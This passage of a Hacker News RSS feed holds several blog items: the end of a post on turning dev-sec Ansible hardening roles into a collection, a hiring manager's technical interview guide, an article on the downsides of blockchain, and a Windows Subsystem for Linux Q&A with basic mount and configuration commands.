<p>The roles were tested with the help of test-kitchen (I wrote about it <a href="https://www.zufallsheld.de/2016/01/05/testing-ansible-roles/">here</a>) and our trusted <a href="https://dev-sec.io/baselines/">Inspec Baselines</a>. We kept the baselines but replaced test-kitchen with molecule, the de-facto standard for testing Ansible content. This made it possible to test our collection in the same way locally as done in CI. Speaking of CI: We replaced travis (good riddance - Travis <a href="https://blog.travis-ci.com/2020-11-02-travis-ci-new-billing">changed</a> their pricing model) with <a href="https://github.com/features/actions">Github Actions</a>.
Now every role inside the collection has its own pipeline that only runs when files from the role change. We still test our roles on a plethora of operating systems and the most important ones (CentOS and Ubuntu in its various versions) are all supported with all roles.</p>

<p>One problem with the new releases existed: since we wanted to re-use the ansible-os-hardening repository for the collection, we could not start from version 1.0.0 for the collection since the tag already existed. So to no break the old role we decided to continue the version from the role in the collection. This is why we started with version 7 in the collection.</p>

<p>Releasing new versions with a changelog was something we already <a href="https://github.com/dev-sec/ansible-os-hardening/issues/269">automated</a> some time ago. We wanted to keep the nicely formatted changelogs and automatic releases and modifying the existing Github Actions was no problem.</p>

<p>Our plan how to actually migrate the roles into the collection looked like this: Start building the collection and use the roles as submodules inside the monorepo. This way we can continue to support the separate roles and the roles inside the collection cannot diverge from the legacy roles.</p>

<p>When everything was migrated, we planned to archive the old roles and link to the collection.</p>



<p>There were some problems along the way but nothing we couldn’t fix.</p>

<p>Along the creation of the collection we needed to update our inspec-baselines as they needed more features to support all our operating systems.
That means we now support newer versions of MySQL and MariaDB (<a href="https://github.com/dev-sec/mysql-baseline/pull/59">https://github.com/dev-sec/mysql-baseline/pull/59</a>, <a href="https://github.com/dev-sec/mysql-baseline/pull/57">https://github.com/dev-sec/mysql-baseline/pull/57</a>) and we support Arch Linux in the linux-baseline (<a href="https://github.com/dev-sec/linux-baseline/pull/136">https://github.com/dev-sec/linux-baseline/pull/136</a>).</p>

<p>We also wanted to replace Inspec with its free distribution <a href="https://cinc.sh/">cinc-auditor</a>. This was surprisingly easy as the people behind cinc made it very easy to install cinc-auditor and use it as a drop-in replacement for Inspec. See this <a href="https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/e7a47a1d342e1b45ceeeae7a1ff247f58ce3434e">commit</a> for details.</p>

<p>There was an <a href="https://github.com/ansible/ansible/issues/66304">issue</a> in Ansible that we needed to work around. This was done by <a href="https://github.com/schurzi/">@schurzi</a> here: <a href="https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/3f7598b5bae80f96cad3ad068f0d57b3e1e538ed">https://github.com/dev-sec/ansible-os-hardening/pull/291/commits/3f7598b5bae80f96cad3ad068f0d57b3e1e538ed</a></p>

<p>Our mysql-hardening-role relies on a existing installation of MySQL or MariaDB. For this we used geerlingguys mysql-role because it supports many operating systems. However the role has some issues and unmerged pull requests that prevented us to use geerlingguys role as is. We had to <a href="https://github.com/dev-sec/ansible-role-mysql/">fork</a> the role and incorporate some PRs and fixes. We hope we don’t have to continuously support the fork though.</p>

<p>The hardest bug we encountered was a problem with AppArmor and MySQL on recent Ubuntu distributions. Here’s the bug: <a href="https://bugs.launchpad.net/ubuntu/+source/mysql-5.7/+bug/1610765">https://bugs.launchpad.net/ubuntu/+source/mysql-5.7/+bug/1610765</a>.
A faulty AppArmor profile prevents MySQL from starting because AppArmor blocks access to MySQL’s configuration files.
And Github Actions run on a Ubuntu 18.04 virtual machine with AppArmor enabled. So I wondered why the role does work when running molecule locally (btw: I use Arch) but not in the CI-pipeline.
It took some days to figure this one out. However once I found out the reason for this, the solution was found much faster. <a href="https://robertdebock.nl/">Robert de Bock</a> also had this problem and fixed it <a href="https://github.com/robertdebock/ansible-role-mysql/commit/7562e99099b06282391ab7ed102b393a0406d212">here</a></p>

<p>We also dropped support for some operating systems:</p>

<ul>
<li>CentOS 6 because support ends in November 2020</li>
<li>Oracle-Linux because supporting it is really cumbersome and we don’t know anyone that uses our roles on Oracle</li>
</ul>



<p>It’s here:</p>

<ul>
<li><a href="https://galaxy.ansible.com/devsec/hardening">Galaxy</a></li>
<li><a href="https://github.com/dev-sec/ansible-os-hardening/">Repository on Github</a></li>
</ul>

<p>Please share your feedback with us, ask questions on the mailing list, open issues and pull requests on our repo!</p>



<p>We plan to archive the repositories of the roles incorporated in the collection and redirect everyone to the collection. The open issues and pull requests will be moved or closed.
This way, no code gets lost and (almost) no links will be broken.</p>

<p>Of course we want to continue working on the collection and support more operating systems and more software! If you want to help, reach out!</p>



<p>I want to thank the devsec team, especially <a href="https://github.com/micheelengronne">@micheelengronne</a>, <a href="https://github.com/schurzi/">@schurzi</a> and <a href="https://github.com/chris-rock">@chris-rock</a> for their work and support in creating the collection and this awesome opensource community!</p>

    </article>
  </div>
</section></div>]]>
            </description>
            <link>https://dev-sec.io/blog/2020-10-11-ansible-collection/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067897</guid>
            <pubDate>Thu, 12 Nov 2020 09:02:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Acing your technical interview – a hiring manager’s guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067800">thread link</a>) | @ochronus
<br/>
November 12, 2020 | https://ochronus.online/acing-the-tech-interview/ | <a href="https://web.archive.org/web/*/https://ochronus.online/acing-the-tech-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-605" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<p>Even though interviewing for a software engineering job can be intimidating and frustrating (with whiteboard exercises, remote coding challenges, and even full days of onsite interviews), it’s a lot easier when you know what to expect and are well-prepared.</p>
<p>I’ve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind. My advice may not get you into Facebook or Google but will definitely increase your chances at mid-sized companies with a good culture!</p>
<p>In the first part of this article, I’ll give some context, then give you an actionable list to improve your experience and chances in your next interview</p>
<p>If you’re only interested in the actionable list, feel free to skip ahead to it.</p>

<h2 id="what-you-think-about-the-technical-interview-might-be-incomplete"><span id="What_you_think_about_the_technical_interview_might_be_incomplete">What you think about the technical interview might be incomplete</span></h2>
<p>First and foremost, a technical interview is almost never only technical. Up to a certain (and honestly, very useful!) level growing as a ‘coder’ is not that complicated. Many candidates perform pretty well if we purely look at their coding skills.</p>
<p>The thing is, you’ll rarely work alone in isolation on your own codebase. You’ll have teammates, you’ll need to agree on things with them, you’ll build on others’ code and others will build on your code. You’ll need to build solutions with a certain level of quality, in a future-proof way, for extensibility, and with performance in mind. Depending on your role and level, you’ll need to architect systems. You’ll need to mentor other engineers. You’ll need to onboard new team members. You’ll need to proactively reach out to other teams in the company and understand their points of view and problems. You’ll talk to product managers, UX researchers, designers, even customers sometimes. You’ll need to manage projects, make tradeoffs and decisions, and align other engineers with that.</p>
<p>Read my article on&nbsp;<a href="https://ochronus.online/technical-interview-myths/">the most common 11 technical interview myths</a></p>
<h2 id="types-and-stages-of-technical-interviews"><span id="Types_and_stages_of_technical_interviews">Types and stages of technical interviews</span></h2>
<p>Most companies use a combination of these steps:</p>
<ul><li>Screening call with a recruiter – We’re interested in your basic motivations, we’d like to have a gut feeling about what you’re looking for and do some sanity check here. You might get asked about your salary requirements, support you need for visa or relocation, and timelines (when could you start, etc.). Some recruiters will also ask you whether you have applied elsewhere so they know how urgent this is for them and you.</li><li>Screening call with the hiring manager – Expect some deeper dive into your experience on multiple fronts – tech and ‘soft skills’ alike. As a hiring manager, I’ll prepare by checking out your CV for talking points, maybe even your LinkedIn profile, and definitely GitHub. I’m not trying to judge you, I’m just looking for points of connection. I’ll answer any questions you have about the role, the company, the culture, potential teams you’d be joining, etc. etc. My ultimate goal with this is twofold: would we be a good match for your (and vice versa) and whether I think you’d be successful in the role.</li><li>Remote technical screening – An alternative, or at some places precursor to the online coding exercise. This is with a human on the other end of the line – solving tech problems together, usually, you walk them through your solution.</li><li>Online coding exercises (LeetCode, HackerRank, etc.) – I know you all hate this. We need such a step to filter out people who can’t even code at all early on. You’d be surprised about the number of such applicants. I avoid algorithm/data structure exercises here and try to come up with somewhat interesting ones. Some companies use a much heavier set of exercises and base their judgment of your technical skills solely on this. While I don’t agree with that strategy, you need to get prepared for this, too.</li><li>Take-home assignment – this is one of the most polarizing interview steps for engineers. Some hate it, claiming it’s just free labor for the companies and it takes too much time, others love it because they feel they have the freedom of giving it much time, really showing off their skills in their own comfortable environment. Whichever camp you’re in, you can expect some companies requiring this. You usually get a somewhat specified problem to solve and you’re given different levels of freedom on how to solve it – some companies don’t mind you choosing whichever stack you like, others will even specify the framework.</li><li>Onsite workshop / remote workshop – I think this is the most interesting of all steps (well, for me at least). It’s about solving problems together with people from the company in a simulated environment. You’ll need to show your communication, decision-making, and even prioritization skills here. Sure, people will look at the quality of your code, too, but ‘soft skills’ are just as important here. We’ll get strong signals about how it would be having you on the team.</li></ul>
<h2 id="cracking-the-technical-interview"><span id="Cracking_the_technical_interview">Cracking the technical interview</span></h2>
<h3 id="ask-the-recruiter-or-the-hiring-manager-before-the-interview"><span id="Ask_the_recruiter_or_the_hiring_manager_before_the_interview">Ask the recruiter or the hiring manager before the interview</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg.webp 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 306px) 100vw, 306px">
<img width="306" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20306%20300'%3E%3C/svg%3E" alt="ask the recruiter or hiring manager 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg 306w, https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1-300x294.jpg 300w" data-lazy-sizes="(max-width: 306px) 100vw, 306px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-the-recruiter-or-hiring-manager-1.jpg">
</picture>
</figure>
<p>Take the guesswork out of the equation. If you feel you don’t have enough information to prepare, just ask for more! We’re here to help you succeed. I really mean it. Sometimes we aren’t doing a great job with sharing enough information proactively about the interview steps but that’s not intentional! I’m always happy to help you prepare better – ask about anything, please. You’re doing both of us a favor with that. Ask during the previous interview step or just drop me an email at any time.</p>
<h3 id="show-up-on-time"><span id="Show_up_on_time">Show up on time</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 4">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg.webp 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 399px) 100vw, 399px">
<img width="399" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20399%20300'%3E%3C/svg%3E" alt="arrive on time 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg 399w, https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1-300x226.jpg 300w" data-lazy-sizes="(max-width: 399px) 100vw, 399px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/arrive-on-time-1.jpg">
</picture>
</figure>
<p>Make sure you’re there on time. If you can’t, for some reason, please let us know, we’ll happily organize for another time, no hard feelings. Showing up on time isn’t only about respecting each other’s schedule – interview time slots are usually 100% utilized and by arriving 10 minutes late you’re reducing your own chance to be successful. You’re also making it more stressful for yourself than necessary. If you need time for commute or for your Zoom/Google Meet setup, think ahead and give yourself a buffer before the start.</p>
<h3 id="don-t-jump-right-into-solution-mode-read-distill-paraphrase"><span id="Dont_jump_right_into_solution_mode_-_read_distill_paraphrase">Don’t jump right into solution mode – read, distill, paraphrase</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 5">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg.webp 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 328px) 100vw, 328px">
<img width="328" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20328%20300'%3E%3C/svg%3E" alt="read distill paraphrase 1" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg 328w, https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1-300x274.jpg 300w" data-lazy-sizes="(max-width: 328px) 100vw, 328px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/read-distill-paraphrase-1.jpg">
</picture>
</figure>
<p>The biggest mistake you can do is thinking you understand the problem or what’s asked of you and jumping right into coding. Take your time, carefully read the problem statement, distill it, don’t think of solutions just yet. When you feel you understand what’s asked of you or when you thought about clarifying questions to ask, communicate. Paraphrase what you understood from the problem statement so you can verify it with your interviewers. Only when you’re on the same page can you shift into solution mode. Even if you come up with the best solution ultimately if you skip this step I’ll remember and have doubts about how it’d be to work with you. Thinking aloud is really useful here – it will help you and help me too to understand what’s on your mind.</p>

<h3 id="be-articulate-and-communicate-clearly"><span id="Be_articulate_and_communicate_clearly">Be articulate and communicate clearly</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 6">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg.webp 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg.webp 300w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 401px) 100vw, 401px">
<img width="401" height="255" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20401%20255'%3E%3C/svg%3E" alt="communicate clearly" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg 401w, https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly-300x191.jpg 300w" data-lazy-sizes="(max-width: 401px) 100vw, 401px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/communicate-clearly.jpg">
</picture>
</figure>
<p>Even if you know your trade, if you fail to communicate clearly during your interview we’ll have no way of knowing. This takes practice for most people, so take your time and prepare! Use standard terms that other engineers can relate to, avoid passive voice, and be able to articulate what’s going on in your mind while you’re thinking. If you need some time to think quietly, say so, don’t just fall silent suddenly. We’re trying our best to communicate our expectations around this but it might be a bit late when you’re in the interview. Trust me on this one, practice here goes a long way.</p>
<h3 id="ask-clarifying-questions"><span id="Ask_clarifying_questions">Ask clarifying questions</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 7">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E">
<img width="269" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20269%20300'%3E%3C/svg%3E" alt="ask clarifying questions 1" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/ask-clarifying-questions-1.jpg">
</picture>
</figure>
<p>While you’d think the interview is about you answering questions, expect that you will need to ask a lot of questions! When you are in the interview and something is not clear don’t default to thinking “Oh god, I should know this, I should understand” – sometimes we are interested in how you behave in such situations, and sometimes we’re just simply not good enough in giving enough context. If you’re stuck, a good technique is to ask for clarification! It’s also 100% OK to say things like “I didn’t quite get that. Could you rephrase please?” or “I’m not sure I understand what you’re asking”. These are good signals! I expect my team members to behave like this. These are not signals of you failing. I know it feels like that, but trust me, it’s just your brain playing tricks on you. I highlight this during the interview several times, to make sure the candidate feels safe asking such questions. Another technique I wholeheartedly welcome is paraphrasing – e.g. “What I understood from what you said is that I should implement this using co-monads” (said nobody ever).</p>
<h3 id="demonstrate-your-tech-skills-the-right-way"><span id="Demonstrate_your_tech_skills_the_right_way">Demonstrate your tech skills the right way</span></h3>
<figure><picture title="Acing your technical interview – a hiring manager’s guide 8">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg.webp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E">
<img width="293" height="300" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20293%20300'%3E%3C/svg%3E" alt="t shaped engineer" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/11/t-shaped-engineer.jpg">
</picture>
</figure>
<p>Make us see that you’re deeply proficient in at least one technology. This can be a programming language, for example. Also, demonstrate that you know the adjacent technologies – most companies are looking for so-called T-shape engineers. This means that mentioning other aspects of the problem and the solution goes a long way. For example, if you’re asked to implement a service in NodeJS, mention how you’d deploy, monitor, and scale it, even if that’s not explicitly asked. No need to go into too many details (unless people ask you). If you’re only focused on a single piece of the puzzle I’ll have a hard time seeing how you’d perform well in a changing environment (where you’ll need to make connections and work on multiple zoom levels and be ready). This is a very generic statement and might not be true in the case of highly specialized roles, of course. On the other hand, if you say your primary language is Python yet you can’t seem to show even a basic understanding of it, that’s a no-no. Work on the stem of that T, too. Hopefully, you’ve clarified what you’d be doing on the interview upfront (see advice #1) so you can think about adjacent technologies in advance.</p>
<h3 id="don-t-get-too-focused-or-stuck-on-a-solution"><span id="Dont_get_too_focused_or_stuck_on_a_solution">Don’t get too focused or stuck on …</span></h3></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/acing-the-tech-interview/">https://ochronus.online/acing-the-tech-interview/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/acing-the-tech-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067800</guid>
            <pubDate>Thu, 12 Nov 2020 08:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need a blockchain solution for your next project]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25067702">thread link</a>) | @shrmv
<br/>
November 12, 2020 | https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project | <a href="https://web.archive.org/web/*/https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Blockchain is one of the hottest technology fields of the last decade, together with machine learning and big data. According to the <a rel="nofollow" href="https://www2.deloitte.com/content/dam/insights/us/articles/6608_2020-global-blockchain-survey/DI_CIR%202020%20global%20blockchain%20survey.pdf">Deloitte 2020 Global Blockchain Survey</a>, businesses worldwide find blockchain an integral part of organizational innovation. </p>
<p>Properly implemented, a blockchain solution can make parts of your business transparent or enable different actors to cooperate quickly and trustlessly. </p>
<p>But today, we wonâ€™t examine blockchainâ€™s strengths. Instead, we will look at why itâ€™s not the perfect choice for all your software projects.  </p>
<h2>Blockchain is more expensive</h2>
<p>From our experience, infrastructure and maintenance costs for a blockchain solution are typically 10-15 times higher compared to an ordinary server with a database running on AWS or a custom AWS/GCP/Azure solution.</p>
<p>Even when using economically efficient Azure solutions, it can cost up to ten times more when compared to a centralized DB with similar functionality running on AWS.</p>
<p>Therefore, itâ€™s necessary to seriously weigh the costs of running your solution vs. the need for transparency and distribution that blockchain offers. </p>
<h2>Blockchain scales worse</h2>
<p>Performance and scalability are the two major bottlenecks for any blockchain project. </p>
<p>From our experience working for large enterprise companies such as Bayer AG, Delta, PwC, and others, blockchain solutions that work fine for hundreds and thousands of users degrade in performance quite quickly when they need to serve more than ten thousand users.</p>
<p>Scaling blockchain, on the other hand, usually requires a complete rework of the core. Sometimes, there might even be no viable solution. So, despite some ambitious claims by blockchain companies, scaling is still an immature topic in the blockchain world.</p>
<h2>Blockchain is about transparency, not privacy</h2>
<p>Privacy is an issue. It is challenging to maintain privacy on the blockchain. In contrast to regular solutions, existing blockchain solutions are often all about transparency rather than privacy.</p>
<p>Solutions that provide the required level of privacy typically have to compromise on performance through zero-knowledge proofs or other kinds of encryption, which is costly.</p>
<p>Another problem with privacy is that most of the time, blockchain is permissionless or has very primitive permissions levels. Therefore, solutions for permissions are built on top of it as an additional middle layer, which, of course, adds performance overhead, degrades scalability, adds implementation and execution costs, etc.
Conclusion</p>
<p>There are three significant challenges that blockchain projects face: performance, scalability, and privacy. While there are multiple benefits for using blockchain, such as transparency and the ability to operate trustlessly, they need to be weighed against the downsides. </p>
<p>We want to share our knowledge with you about potential problems not to talk you away from blockchain, but to make sure the choice is clear and the right one for your project. If you still arenâ€™t sure and would like to have a 30-minute consultation with an expert in the field, youâ€™re welcome to <a href="https://exyte.com/contacts">contact us</a>. </p>
                </div></div>]]>
            </description>
            <link>https://exyte.com/blog/why-you-dont-need-a-blockchain-solution-for-your-next-project</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067702</guid>
            <pubDate>Thu, 12 Nov 2020 08:25:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WSL explained – crucial Q&A to get to know near-native Linux experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25067677">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><a href="https://solidstudio.io/index.html">Solidstudio</a>
                    &gt;&gt;
                    <a href="https://solidstudio.io/blog/blog.html">Blog</a>
                    &gt;&gt;
                    &gt;Windows Subsystem for Linux (WSL) explained – Q&amp;A
                </p>
                <p>No matter if you program in <a href="https://solidstudio.io/technologies/java.html">Java</a> or <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> or with other technologies, operating on Linux has a number of advantages. One of them is access to Linux Bash with its useful commands.</p>
                <p>However, some developers have to or prefer working on Windows. As stackoverflow.com 2020 <a href="https://insights.stackoverflow.com/survey/2020#development-environments-and-tools" rel="nofollow">survey</a> showed, almost half of developers (45,8%) work in the Windows environment. There are tools that bring them closer to the Linux world like <a href="https://www.cygwin.com/" ref="nofollow">Cygwin</a>.</p>
                
                <h2>The WSL provides a near-native Linux experience</h2>
                <p>Some time ago Microsoft introduced WSL, a new tool that brings Windows users even closer to the Linux experience. Here you can find gathered some frequently asked questions and our expert’s experience to help you get a better understanding of the WSL.</p>
                
                <h3>What is WSL?</h3>
                <p>WSL or Windows Subsystem for Linux is a part of the Windows operating system that allows running native Linux binaries. A number of distributions exist that can be installed and used. </p>
                
                <h3>How can I install WSL?</h3>
                <p>First thing to do before installing any Linux distribution is to install the WSL itself.</p>
                <p>Go to <i>Control Panel</i> → <i>Programs</i> → <i>Programs and Features</i> → <i>Turn Windows features on and off</i>.</p>
                <p>Select <i>Windows Subsystem for Windows</i>, confirm, and restart the system.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/wsl-install.png" alt="Turn Windows features on and off dialog with Windows Subsystem for Linux selected"></p><p>Now you are ready to select and install a Linux distribution of your choice.</p>
                                
                <h3>What Linux distributions are available on WSL?</h3>
                <p>To find a list of available distributions open Windows Store and search for "Linux".<br>
                The most popular are:
                </p><ul>
                <li>Ubuntu 18.04 and 20.04</li>
                <li>SUSE Linux Enterprise Server</li>
                <li>Debian</li>
                <li>Fedora Remix for WSL</li>
                <li>Kali Linux</li>
                </ul>                
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-store-search.png" alt="Windows Store search result for term Linux"></p><h3>Is it possible to run graphical Linux applications from WSL?</h3>
                <p>Yes, it is possible. You need to install an X Window System server application on your Windows, for example <a href="https://sourceforge.net/projects/xming/" rel="nofollow">Xming X Server for Windows</a>.</p>
                <p>Then check if your WSL system has a <span>DISPLAY</span> environment variable set up. If not set it to <span>:0</span>.</p>
                <pre>export DISPLAY=:0</pre>
                <p>After this configuration you are free to run native Linux applications with user interface.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/xclock.png" alt="WSL running xclock via Xming"></p><h3>Where is wsl.conf located?</h3>
                <p>Each WSL instance can be further configured by creating and editing a config file <span>/etc/wsl.conf</span>.</p>
                
                <h3>How to access Windows files from WSL?</h3>
                <p>All fixed drives with the NTFS or ReFS file system are automatically mounted in <span>/mnt</span> directory. For example a C: drive can be accessed in <span>/mnt/c/</span>. The directory where drives are mounted can be specified in <span>/etc/wsl.conf</span> as follows:</p>
                <pre>[automount]
root=/</pre>
                <p>This setting will cause drives to be mounted under the root folder, so the C: drive would be accessible through <span>/c</span> folder.</p>

                <h3>How to access pendrive from WSL?</h3>
                <p>Unlike fixed drives, removable drives are not mounted automatically. To access files stored on a USB stick you need to mount it yourself. For this purpose, use these commands (assume the drive letter in Windows is F):</p>
                <pre>sudo mkdir /mnt/f
sudo mount -t drvfs H: /mnt/f</pre>

                <h3>How to connect to a DVD drive from WSL?</h3>
                <p>Optical drives are not as popular nowadays as they used to be. Nonetheless, they can be accessed the same way as pendrives (assume G is the drive letter):</p>
                <pre>sudo mkdir /mnt/g
sudo mount -t drvfs G: /mnt/g</pre>

                <h3>Where are WSL files stored?</h3>
                <p>WSL files are exposed through a network share <span>\\wsl$\[distro name]</span>, for example my home directory is at <span "="">\\wsl$\Ubuntu-20.04\home\pawelb</span>.</p>
                <p>Physically the WSL files are located at <span>%USERPROFILE%\AppData\Local\Packages\[distro name]</span>. My home folder is at this rather long path <span>C:\Users\pawelb\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\home\pawelb</span>.</p>
                <p>However, it is worth noting that manipulating WSL files from within Windows should be avoided as it can destroy Linux-specific file metadata. If you need to manipulate files on both WSL and Windows, store them on a Windows drive and access them from within WSL via <span>/mnt</span>.</p>
                
                <h3>Is it possible to run Windows programs from within WSL?</h3>
                <p>Yes, the WSL was built with interoperability in mind. It can run native Windows programs. However, if this feature is not needed, the user can disable it by adding <span>enabled=false</span> into <span>[interop]</span> section in <span>wsl.conf</span>.</p>
                <pre>[interop]
enabled=false</pre>

                
                <h3>What terminal application to use?</h3>
                <p>Any terminal can do the job, even the good old <span>cmd.exe</span>. Just run the WSL command in. There is however one great application that makes running the WSL console easier. It’s <a href="https://docs.microsoft.com/en-us/windows/terminal/get-started" rel="nofollow">Windows Terminal</a> and it can be installed from Windows Store. It automatically detects any WSL distributions installed and adds an option to run its console. It also supports regular Windows Command Line, PowerShell, and Azure console out of the box. Also, it supports tabs and split view inside a tab.</p>
                <p><img src="https://solidstudio.io/img/blog/windows-subsystem-for-linux-explained/windows-terminal.png" alt="Windows Terminal application"></p><h3>Caveats of interoperability with Windows</h3>
                <p>By default, WSL can run Windows binaries and also appends its <span>%PATH%</span> variable into the <span>$PATH</span> variable of Linux running under WSL. In most cases, this is useful or at least does no harm. However, sometimes unexpected behavior occurs.</p>
                <p>This happened when I tried to run <span>npm</span>.</p>
                <pre>$ npm -v
module.js:471
    throw err;
    ^

Error: Cannot find module '\\wsl$\Ubuntu-20.04\c\Programs\nvm\v6.10.2\node_modules\npm\bin\npm-cli.js'
    at Function.Module._resolveFilename (module.js:469:15)
    at Function.Module._load (module.js:417:25)
    at Module.runMain (module.js:604:10)
    at run (bootstrap_node.js:393:7)
    at startup (bootstrap_node.js:150:9)
    at bootstrap_node.js:508:3</pre>
                
                <p>This error message is not helpful at all. What happened?</p>
                <p>After some investigation, I found out that I had also installed npm on Windows and WSL was using this executable to run. This unfortunately failed under WSL environment.</p>
                <p>A fix was rather simple. I disabled appending Windows <span>%PATH%</span> to WSL <span>$PATH</span>.</p>
                <p>This can be done in two ways.</p>
                <p>The first is to use the Registry Editor (regedit) to add a DWORD <span>AppendNtPath</span> with value <span>0</span> under <span>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss</span>. This affects all WSL distributions.</p>
                <p>The second way is to set a property in <span>/etc/wsl.conf</span>. This affects only a single distribution.</p>
                <pre>[interop]
appendWindowsPath=false</pre>

                <h2>The WSL is a great subsystem for Windows </h2>
                <p>With the introduction of Windows 10, a lot has changed. It seems that the system and its features are more and more thought-out and intuitive. A programmer needs a proper working environment. With WSL, Windows is keeping up with developments in this area, and looks like it is a step in the right direction. It’s worth having an eye on the development of this solution, hoping that in the future the developers will have a variety of systems that can really compete with each other. Looking for a good and stable, seamless tool, it is worth trying with the WSL.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/windows-subsystem-for-linux-explained.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067677</guid>
            <pubDate>Thu, 12 Nov 2020 08:21:29 GMT</pubDate>
        </item>
        <item>
            <title>
